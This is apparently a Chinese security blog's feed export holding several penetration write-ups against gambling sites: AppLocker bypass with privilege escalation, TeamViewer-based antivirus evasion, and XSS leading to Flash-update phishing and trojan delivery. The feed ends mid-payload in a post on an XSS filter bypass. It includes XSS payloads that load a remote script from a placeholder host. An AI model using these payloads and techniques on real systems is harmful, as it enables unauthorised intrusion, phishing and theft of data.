0aa5e500a750f057ea75ac3aad2a1420eb66805d6b27210e747e130d7b2df950a3c83cff313689c455c8e02416982bd95806ab4cda6475f05dcd17348b283c40038f98ce1b8b5bbdd49ecc66fb7327de265bdaa259f5e424e60092deaf02f2221b7eb0b09b31d83c6918b0ef841709d5a3d6719b1d4bbcfa7814f3409e246b069f1693302f76675e7d4bc29dd885b7a57fe7135cb5b9b50fc1a12ae6de10f00994e32b688bb0b4e298dc4f45950c66c18fe35c02b77eeeaf9af932b26d9d15a29fcbffcd6e8c2190d8893e0965c1a4077695b98a30c3fdbfa064da21bd018aa3f879cefeb254df2725afff0c4f4e6166775f852c0b4605a5871807e549b63ba5e1685c0731bfd7da36287c96f66bd4738e181cc9f7540a0d30cac9636b864372dfb565942d6fec07e437b939609d09fbe677b19897fb586e2f41b9d04571e506bc27d68239fee05c85fbbede736eef2141bbe82f5a2bf4c751bddbd87b8d84bbaf83af1fa00fd00895f389930deb7e7023e583b2cc1ac8066ef60662e3648849151c74d63f3ff894a0860b6252a3196b8b7cd5c297321262e25b83388260771baa1410e111ad4306a6dcdf300f0ca4b4a45076d8ee1f1e5fd96dd17c33e817a2a5a2911de6c5133835933115c3682e81c34ceb61f5d0c8ab56bfc9436347ae706421731cc7f9db3d6ebd9794baf05315654bc18091fd2e51322101f312fadee992794176dfe3b6d7a29c20f01270a467299fd7ff778e988d5f6799396ef61ddc48766b873c7c8f12b8f3c11402a7c28ee1bcf1b1f07d5748da29cc72f81c12f2d8a84b7646c491f49509ea2d8110312cf7ad2688b296ec1ca78d70837b78611009743eb3b6297a64bb1d5feb565bc9a43d8d997c93b3845eeee7fd2a82d6a88a25bde18e645462ef6db483f21c5a7fa3cfad8ce42be872aa171dee7755f78db591f5c67378d3f9f4f227476ec40db35975d8d20f78664e58ad68a55d259485926002d41769fad0b39b5b0cafc99f07497986dea625db4b01a911c0a667edd48296fa77cecd8e440739a91883503dccf39f7004883822f0ff2e7fd60eef5c69bc54b15189f0c89211da3f4aa9e509039635f13632d53d47aef91545432f3aa1dbefcd0966868134ad9dbb9e7fda3a4577fba4111eea75f1faa82bd4f818dde4780b2411b4c5cee96f10c768cee4c1785b66369721d84d34e6edffa9573b851ee9d4d0d7dc83aaa17fb50c15434e58fcba7349d3190ebfd038be1787fdf938f8eb5c65cfb02fe467815df757e137a3662d4765bf72f3518362b42ed1e24dd1c6f3def7d0dbab6f7b301c047ae7950abee021d04bcc1ca6b38fd86a5529035c9235ae5cb029d9af067a993bb228e5d7e80661dd667b6308f6d22031044cb59c189feae021b65deba22a7cfe5db0532502be597c78a305f3ba8b38f3fadd883fea2f36260e322bc453e71ea666c13ef921b1b53b3881d29efb8e28d1da65585090559b5603769260b1b14f0f92eb94a76d17c0b589db384900290cb6729d4d7a7974400c00d6e3a65de57a7bc9b721ae9d6136236b1ceeddf98767b16251a11a6db62c8c7df20a6266a925dc26e18f3f07d6bb26238e2a379e4e5196bf0b4f2c5152f8abfaef4f537731503e4a031b4c344dcd3f7759337289a3f9ca92a28affe7d1e8ad810beac63f29d68c47e696f71708fbafeb174059d53228bc40f954aa429ac570b5dba7db6753cd40164d735ca17095aaf809fc74103bd230d46c86929c38863e70409c0636c36be43b3091b8d275011511075f10e52dbdf3591efbe52ad13673ce5e25a3a11afabdadb6b9ee82bfeb35ee5c8b6a73c70b1ecfaaea5c8cbd1a8f7538563101eae35ef0c20a08e189ee3112bb9342fee7d759be3083cdb37f985be5d0460f17ec174f019d27911d306ffd6ffb33004e5f834aa611f5cfee7fc70e61fa833383f5dcca7224a17be538af53688a75e3928bbfcc1aab2bc5d0db1ce0a6f7363e5aae17ccc35c802cb71f773581362f04f4a11e18ccad57bf4526d9f65222eb8466f1454b93bf0b07f71c46edfad570c6ab048c615226e67e7adfba11e6fd45ff2c8db3000b157941abcba42fd21082f65a542af7c6d639420474ccbd7dc1a196a7cf230211721276faf9149f3e1f8261df8faa2b8fb989eb94e9d7e12b421f9242c62d37e3b97b970d481d4a1d704604d2c8cad97aab4ecbdae3ed295eb1f56f1cf2b3376d4226c6fdf61f596ebf6d7d2524c0a0a7680c614064ac590265148bf7b9b94dc622bb4e9cb892b63d75114ad505ca47ceeb797fba792298927eb2a41687b1e187bb97a0ab1645a9516a8cea6274bf3fc88e823e4e654288c4cddd1be194d6400c8d6cc97658f333cd2240bf24ece83a62425a55627dff51169777144d56d08725e9a855d9c3aaa8488497eac968be0ed5d90247227f2559dd33768106fedadf02decaf4058a8c0aa602aa140bd28bcfd1ca3663ce55ff2effe5515e711a1fdd3ff4c96faca64cdd48a8b0175ee95c4ca138ca45eb5a147eba8213e338d608fafce8e72d4f65c3e6f904286f9d3895f814cb78b22882379fe25678e4ed2afac401e7ce0af76cf83a33f5624939eb777af54cd713b297987c0a8b90bce0607f49bbfce9368ffb237789d889bd3d287634e157f9c177c7bd3c58a4bb9f9f2baae152840a522ce6038367684e77746e9cd9b0a6ccab27777cbd63b22c6a88de91aeea205399058ca10bb1bd0f99d09831cc6c2f839f0dc9a111a1c246d9cca3a9edafc9fe79f89863e891e96e9d75a6b6d880ed69cbc57f5f534b3793a445f71d394e6fca430046223c8a94d3da0a0c047ca0cd64c19b2f9759daad0412afe216cb8563a18e9166ffc0319e27ed85a6d17f080b6b5bf6d689cc28d506197df5d9fac04e2906cc700426f91ccb48b9235175551ced722c7843d9957bfa6068f313930ce5a5146a1fe7565d38f46685f75a24610e8c681a93c2625e9170658b6385a34b948c81add187ace312f79371835394b95b3fbb8e72cf57bdaedabcffefac1f42e06b6a11e0c9d2ed7ff31a7bae3885f2d4b3243db1972e5dea3834035eaeabf1ee79a7d0ecc978f75c163db5d9dd3502ac450fe09e6427893fe40a15a59a7794c3419ad46d44b3f6523d1f22666d6b407d18e5f59c4fea0e99a1e9968d645a4f69fd4f46a83db72435762ced0e58027e48fe186aa8e17a9bf466e9deddfe85203b66bbae38f2749cc937e3844dbcb2d4d7ea305b57d81d840dbc31a7c4a31a979f347494f20be63e6e02cfb79b466ce79ee4fadab088c1d5367f5aaf742d5619ac34cefc3a8f7741d4e721e32f8174d77a9b352aa359ff6326e28b8802</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|后渗透之Bypass Applocker到提权</title>
    <link href="https://www.se7ensec.cn/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/"/>
    <id>https://www.se7ensec.cn/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/</id>
    <published>2020-01-07T16:10:24.000Z</published>
    <updated>2020-11-14T19:57:04.506Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>冷静分析，沉着应对。</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>提示：当个反面案例看就好，实际上拿下的方式远没有下文说的那么麻烦，只怪自己太心急…<br>本来是之前BC项目搞下来的一个推广站，当时只拿到了Shell</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/1.png" alt="1"></p><p>权限是一个普通用户，想提权进一步收集服务器上的信息时，发现运行各种东西都是权限拒绝，提示组策略阻止了这个程序，当时因为还有的别的事情，就没继续研究了（用户名比较敏感，后面全程打码）。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/2.png" alt="2"></p><h1 id="0x02-Bypass-Applocker"><a href="#0x02-Bypass-Applocker" class="headerlink" title="0x02 Bypass Applocker"></a>0x02 Bypass Applocker</h1><p>最近突然想起来了，就继续搞一下，问了下群里的师傅</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/3.png" alt="3"></p><p>知道是什么东西以后就好说了，耐心找一找总会有收获的，附上Applocker介绍：</p><p><a href="https://baike.baidu.com/item/Applocker/2300852?fr=aladdin">https://baike.baidu.com/item/Applocker/2300852?fr=aladdin</a></p><p>然后就找到3g师傅的一篇文章：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/">https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/</a></p><p>具体怎么利用就自行看文章吧，看完文章后续的大概思路差不多就清晰了</p><h1 id="0x03-上线到提权"><a href="#0x03-上线到提权" class="headerlink" title="0x03 上线到提权"></a>0x03 上线到提权</h1><p>我想的是bypass applocker让目标服务器执行我的马子上线后在进行后续的提权，然而Shell下执行 net user、tasklist /SVC 等等都没得回显，不然可以通过进程对比判断下杀软（自己写的小轮子，目前可匹配进程已经增加到960+了：<a href="http://get-av.se7ensec.cn/%EF%BC%89">http://get-av.se7ensec.cn/）</a></p><p>既然不知道，那我就拼一拼人品，赌一下主机里没有杀软，通过上面3g师傅文章的第三种方式运行了我的马子，然后就成功上线了，忽略下面那个机器…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/4.png" alt="4"></p><p>CS上线以后再运行某些命令，比如下面这个，还有tasklist /SCV发现还是会拒绝访问</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/5.jpg" alt="5"></p><p>然后又尝试了下CS内置的查看系统进程命令 ”ps“，成功列出了系统进程，看了下确实是没有杀软的</p><p>/* 忘了截图 */</p><p>运行 “shell systeminfo” 发现系统和补丁信息居然可以看到了，然而系统根本没打几个补丁，运气有点好，看了下用户权限，符合Juicy Potato的要求，可以直接尝试下烂土豆提权：</p><p><a href="https://www.4hou.com/posts/vZoL">https://www.4hou.com/posts/vZoL</a></p><p>经过测试发现上线以后（实际上本来就有执行权限，当时没有想到不对劲，事后总结文章时才意识到不太对，详见文末），C:\Users\Public\下有了执行权限，用Juicy Potato带个whoami参数执行下，成功返回了system</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/6.png" alt="6"></p><p>再直接用它执行下马子，等几秒就会过来一个System的会话了，翻了翻目录发现还是个站群</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/7.png" alt="7"></p><p>Administrator权限截个屏看下，怪不得那么多，原来人家都是批量建站的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.08/8.png" alt="8"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>碰巧这次运气好没有遇到杀软，不然肯定会是一路坎坷，也会更有挑战性</p><p>最失败的是这次自己没有提前全面了解Applocker的一些功能介绍： <a href="https://www.anquanke.com/post/id/159892">https://www.anquanke.com/post/id/159892</a> ，心急的搜到了bypass方法就开始用，其实这次遇到的只是文件路径的限制，C:\Users\Public\就可以执行程序，早一点发现的话也不会那么费劲，不过能完整了解到Applocker的机制，也算是一个收获吧</p><p>最后感谢下haya、Beli1v1师傅的指点和帮助。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;冷静分析，沉着应对。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WIN提权" scheme="https://www.se7ensec.cn/tags/WIN%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>TeamViewer在BypassAV中的妙用</title>
    <link href="https://www.se7ensec.cn/2020/01/05/TeamViewer%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/"/>
    <id>https://www.se7ensec.cn/2020/01/05/TeamViewer%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/</id>
    <published>2020-01-04T18:10:24.000Z</published>
    <updated>2020-11-14T19:57:29.049Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。</p></blockquote><a id="more"></a><h1 id="TV官方免安装版"><a href="#TV官方免安装版" class="headerlink" title="TV官方免安装版"></a>TV官方免安装版</h1><p>这是teamviewer官网下载页面： <a href="https://www.teamviewer.cn/cn/download/windows/">https://www.teamviewer.cn/cn/download/windows/</a> ，大部分人都习惯直接下载这个安装版来用</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/1.png" alt="1"></p><p>不知道大家有没有注意过，其实teamviewer也提供了免安装版的，就在安装版的下方</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/2.png" alt="2"></p><h1 id="Bypass-360"><a href="#Bypass-360" class="headerlink" title="Bypass 360"></a>Bypass 360</h1><p>以下全部为联网且查杀引擎全开的情况下操作（见文章封面）</p><h2 id="正常运行"><a href="#正常运行" class="headerlink" title="正常运行"></a>正常运行</h2><p>下图是正常方式运行TeamViewerQS.exe，虽然有提示，但是可以看到默认的选项是 <strong>允许操作</strong> 的</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/3.png" alt="3"></p><h2 id="WebShell下运行"><a href="#WebShell下运行" class="headerlink" title="WebShell下运行"></a>WebShell下运行</h2><p>假设现在我有这台主机的WebShell，直接在大马中执行这个文件</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/4.png" alt="4"></p><p>发现成功弹了出来</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/5.png" alt="5"></p><p>但是我们怎么获取id和密码呢，土司有大佬分享过修改过的tv，支持把账号密码输出到文件，但是后期肯定还是会被杀，今天看到了CoolCat师傅的文章：<a href="https://xz.aliyun.com/t/4078">传送门</a>，文章中有个通过截屏思路获取还是不错的，不过CoolCat师傅用的python截屏，实际上谁也不想每次都去目标机上装个python环境吧，还是应该怎么简单怎么来</p><h2 id="关于屏幕截取"><a href="#关于屏幕截取" class="headerlink" title="关于屏幕截取"></a>关于屏幕截取</h2><p>github上有不少命令行下截屏的项目，我随便找了一个：<a href="https://github.com/darealshinji/cmdline-screenshot-tool">https://github.com/darealshinji/cmdline-screenshot-tool</a></p><p>在WebShell中，执行一下 screenshot-advanced64.exe，发现被360拦截了，c++写的东西360报java漏洞攻击我就不清楚为啥了…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/6.png" alt="6"></p><h2 id="简单绕过360"><a href="#简单绕过360" class="headerlink" title="简单绕过360"></a>简单绕过360</h2><p>这里绕过方式也很简单，screenshot-advanced64.exe 的后缀改成.7z（命令行下执行二进制文件可以无视后缀名），然后上传上来再执行</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/7.png" alt="7"></p><p>然后看一下网站根目录</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/8.png" alt="8"></p><p>screenshost.png就是生成的屏幕截图，如下</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/9.png" alt="9"></p><h1 id="Kill-360"><a href="#Kill-360" class="headerlink" title="Kill 360"></a>Kill 360</h1><p>拿着账号密码直接连，有了远程桌面的权限，360还怕干不掉？</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.01.05/10.png" alt="10"></p><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ol><li><p>目标机要确定可以连接TeamViewer的服务器</p></li><li><p>要使用远程桌面用户权限去运行TeamViewerQS.exe，不然连上也是黑屏</p></li><li><p>以上应用场景只适合管理员不在的时候，因为一旦建立远程会话双方都是会看到的</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="BypassAV" scheme="https://www.se7ensec.cn/tags/BypassAV/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|从Xss到主机上线</title>
    <link href="https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/"/>
    <id>https://www.se7ensec.cn/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/</id>
    <published>2019-12-08T15:10:24.000Z</published>
    <updated>2020-11-14T19:57:14.876Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>要保持学习的好习惯，这次平时学的就用上了。</p></blockquote><a id="more"></a><h1 id="故事的起因"><a href="#故事的起因" class="headerlink" title="故事的起因"></a>故事的起因</h1><p>前几天收到一封邮件，内容是这样的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/1.png" alt="1"></p><p>你说发谁哪里不好，发到我这里来，正好最近辞职了没事干，搞下看看。</p><p>加上那个人的好友以后，象征性的聊了几句，大概就是：我说自己因为网赌没钱借了高利贷，让他带我玩这个，好还上贷款，没说几句就给我发了网址和邀请码（这个站没邀请码注册不上），让我去网站里面充钱，我说好，我先去冲一千，完事师傅你一定要好好带我，然后就去注册了（后来我没充钱，他就一直抖我，给我发消息，觉得烦就把他删了，所以聊天记录也没了，简单口述下没截图）。</p><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="官网截图"><a href="#官网截图" class="headerlink" title="官网截图"></a>官网截图</h2><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/2.png" alt="2"></p><p>信息收集阶段略过，太麻烦了，有云盾（WAF+CDN），看下面云悉指纹识别的图吧，测试各种功能点，没有结果，不得不说，大部分BC安全都是做的不错的。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/3.png" alt="3"></p><p>想了会，看到一个聊天室功能，进去看看都在说啥，结果发现说话来来回回就那几个人，偶尔有几个和我一样的普通会员，我就感觉，这尼玛是不是托啊，一堆什么导师嚷嚷着跟着下注。</p><h2 id="职业习惯："><a href="#职业习惯：" class="headerlink" title="职业习惯："></a>职业习惯：</h2><p>看见框就想叉，一发xss payload打过去：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;XSSURL&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/4.png" alt="4"></p><p>wdnmd没反应？明明加载了啊…问了下别的师傅，说这种情况有可能是有CSP，附上<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">相关介绍</a>，我这里就不解释了，本来打算放弃，想了下万一 img 的没有被限制呢。</p><p>再吃我一发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/5.png" alt="5"></p><p>叮 ~ 叮 ~ 手机响了，多么美妙的声音，payload成功执行，打来一堆cookie（还是不同域名），然而现实是残酷的，这个站有HttpOnly，cookie不能用，历史密码也没拿到，不过不要灰心，咱还有更猥琐的办法。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/6.png" alt="6"></p><h1 id="Flash钓鱼"><a href="#Flash钓鱼" class="headerlink" title="Flash钓鱼"></a>Flash钓鱼</h1><p>既然正面肛不动你，咱就来侧面的。前段时间经常看到无常师傅的flash钓鱼操作，很经典啊，然后就想到自己有天会用到flash官网的钓鱼源码，很早就写好了放在GitHub上：<a href="https://github.com/r00tSe7en/Fake-flash.cn">传送门</a>。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>一个免费空间，一个免费域名（域名可以搞一个 <a href="http://www.flashxxx.tk/">www.flashxxx.tk</a> 这种的，可信度比较高），一个可以正常上线的马子。</p><p>然后xss平台搞个模块，简单解释下代码，一开始重写alert方法并屏蔽网址显示，弹出Flash升级提示，跳转至钓鱼页：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/7.png" alt="7"></p><h2 id="关于马子"><a href="#关于马子" class="headerlink" title="关于马子"></a>关于马子</h2><p>可以做到运行正常安装文件的同时运行马子，骚姿势：<a href="https://www.baikesec.com/webstudy/still/77.html">自解压捆绑文件的利用</a></p><p>为了让自解压的exe文件可以正常运行（已经改成了正常的安装文件图标），必须确保他有解压软件，我就把钓鱼页的自解压文件压缩了下，成了 flashplayerpp_install_cn.zip，这样一来他必须安装解压文件才能打开安装程序，马子自然生效了。</p><h2 id="关于免杀"><a href="#关于免杀" class="headerlink" title="关于免杀"></a>关于免杀</h2><p>由于技术有限，毕竟咱也不是搞免杀的，生成的马子会被部分杀软报毒，也不知道对面用什么杀软，所以想了个猥琐但有效的办法，其实不少下载站下载的文件也爱这么干，哈哈。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/8.png" alt="8"></p><h2 id="一切就绪"><a href="#一切就绪" class="headerlink" title="一切就绪"></a>一切就绪</h2><p>万事俱备，只欠东风，直接发出去刚才写的升级提示+跳转的xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/9.png" alt="9"></p><p>页面成功弹出提示，对方不点确定页面就一直卡住，点了确定就跳来我的钓鱼页（这里钓鱼页也加了点料，让他点返回时无限回跳钓鱼页）</p><p>不过一开始并没有人上线，再点进去一看管理员重置了聊天页的内容。奥利给曾经说过：我们遇到什么困难也不要怕，咱换个号继续叉呗，在间歇性叉叉圈圈了十几次之后，管理员可能是实在忍不住了（管理员：大哥你别弹了，我装还不行嘛），终于运行了我的马子。</p><h2 id="成功上线："><a href="#成功上线：" class="headerlink" title="成功上线："></a>成功上线：</h2><p>这里就上线了一台，不过很幸运，是管理员的机器，不然之前的努力都白费了。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/10.png" alt="10"></p><p>看一会对面在干哈：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/11.png" alt="11"></p><p>这个清楚点，可以看到还依然打开着钓鱼页，俩人还讨论亏钱了，笑死了：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/12.png" alt="12"></p><p>打开了一个账面，这流水咱也看不懂：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/13.png" alt="13"></p><p>再看看有存着啥好东西，两个硬盘一个U盘，C盘E盘没有什么：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/14.png" alt="14"></p><p>F盘里有料了，都是一些会员数据，账单流水，管理后台配置啥的：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/15.png" alt="15"></p><h1 id="点到为止："><a href="#点到为止：" class="headerlink" title="点到为止："></a>点到为止：</h1><p>不多说了，看了下上线的IP，为了挣钱跑的挺远，老哥背井离乡怪不容易的，祝你安安心心的回到祖国的怀抱过个年吧。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.08/16.png" alt="16"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;要保持学习的好习惯，这次平时学的就用上了。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>一处图片引用功能导致的XSS</title>
    <link href="https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/"/>
    <id>https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/</id>
    <published>2019-12-04T15:10:24.000Z</published>
    <updated>2020-11-14T19:58:50.676Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。</p></blockquote><a id="more"></a><h1 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h1><p><font color=#FF0000 >漏洞点：站点产品评论处</font></p><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>一开始尝试XSS，发现程序有过滤，提交均显示Tags are not permitted，最后测出来的是过滤 &lt; ，不过滤 &gt;</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/1.png" alt="1"></p><p>因为提示速度比较快，猜测前端有一层检测。尝试绕过前端检测，burp拦截正常提交的内容，替换xss payload后发送，发现会自动跳转回首页，由此发现程序后端也有内容检测，这里直接xss暂时行不通。</p><p>查看编辑器的其他功能：</p><p>图片上传：<br>可上传aspx（其他可能解析后缀均已尝试），不能解析并跳转至首页。<br>可上传html并解析，这种方式构造的xss通常需要主动攻击，且攻击时易被管理员察觉到异常，暂不考虑。</p><p>表情功能：没什么可利用的。</p><h1 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h1><p>当看到编辑器提示的 img 外部图片引用方式时引起了我的注意，这里感觉可以操作一下：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.png" alt="2"></p><h2 id="正常测试"><a href="#正常测试" class="headerlink" title="正常测试"></a>正常测试</h2><p>先来看下正常引用方式时前端的显示，链接被带入到src中（logo前文字涉及域名，打码）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|XSSURL|xxxxx Logo]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/3.png" alt="3"></p><h2 id="带入payload"><a href="#带入payload" class="headerlink" title="带入payload"></a>带入payload</h2><p>把xss payload 放在链接的位置再看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常规的payload：</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;</span><br><span class="line">构造的payload：</span><br><span class="line">[img|x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;|xxxxx Logo]</span><br></pre></td></tr></table></figure><p>提交后审查元素发现为如下显示：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/4.png" alt="4"></p><h2 id="尝试闭合"><a href="#尝试闭合" class="headerlink" title="尝试闭合"></a>尝试闭合</h2><p>尝试闭合 x 处的双引号，让 onerror 逃逸出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;|hello] </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/5.png" alt="5"></p><p>这里提交后发现payload并没有执行成功，仔细看发现程序输出时分别在 onerror= 和 ; 后面加了双引号。</p><h2 id="闭合成功"><a href="#闭合成功" class="headerlink" title="闭合成功"></a>闭合成功</h2><p>直接给个 &gt; 让它闭合，虽然成功加载了，但是页面显示会有错误，这样十分容易被发现倪端，不够完美。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/6.png" alt="6"></p><p>换个思路通过闭合掉 ; 后面的双引号，显示效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; 